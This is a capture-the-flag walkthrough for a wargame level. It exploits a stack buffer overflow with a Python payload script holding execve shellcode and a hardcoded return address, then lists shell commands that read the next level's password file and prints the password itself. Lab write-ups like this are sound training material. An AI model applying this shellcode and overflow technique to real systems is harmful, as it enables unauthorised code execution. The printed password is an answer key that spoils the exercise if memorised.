# Level 02 Walkthrough

## Binary analysis

The binary is vulnerable to a classic buffer overflow. We need to inject shellcode and overwrite the return address to jump to a writable memory location (e.g., .bss section).

## Exploitation

1. Find the offset to EIP (80 bytes).
2. Find a writable address to jump to (e.g., using gdb or ltrace on strdup).
3. Generate a payload with shellcode, padding, and the target address.

Python script to generate the payload:
```python
offset = 80
shellcode = b"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
padding = b"A" * (offset - len(shellcode))
eip = b"\x08\xa0\x04\x08"  # 0x0804a008 (writable address)
chunk = shellcode + padding + eip
with open('payload.txt', 'wb') as f:
    f.write(chunk)
```

## Commands used

```
python3 exploit.py
(cat /tmp/payload.txt; cat) | ./level2
ls
cat /home/user/level3/.pass
```

## Result

After running the exploit, we get a shell as level3 and can read the password:

```
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

Copy the password for the next level. 